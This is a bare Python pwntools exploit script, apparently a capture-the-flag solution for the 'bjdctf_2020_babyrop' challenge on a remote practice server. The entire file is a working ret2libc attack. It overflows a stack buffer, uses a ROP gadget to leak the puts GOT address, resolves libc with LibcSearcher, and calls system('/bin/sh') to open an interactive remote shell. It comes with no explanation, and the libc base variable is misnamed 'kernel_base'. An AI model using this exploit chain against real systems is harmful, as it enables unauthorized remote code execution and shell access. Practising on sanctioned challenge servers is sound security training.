from pwn import *
from LibcSearcher import *

pop_rdi_ret = 0x400733
elf = ELF("./bjdctf_2020_babyrop")
context.arch = 'amd64'
r = remote("node3.buuoj.cn", 26214)
r.recvuntil("story!\n")
r.sendline(b'a' * 0x28 + flat([pop_rdi_ret, elf.got['puts'], elf.plt['puts'], 0x40067D]))
puts_addr = u64(r.recvline()[:-1].ljust(8, b'\x00'))
libc = LibcSearcher("puts", puts_addr)
kernel_base = puts_addr - libc.dump("puts")
system_addr = kernel_base + libc.dump("system")
cmd_addr = kernel_base + libc.dump("str_bin_sh")
r.recvline()
r.sendline(b'a' * 0x28 + flat([pop_rdi_ret, cmd_addr, system_addr]))
r.interactive()
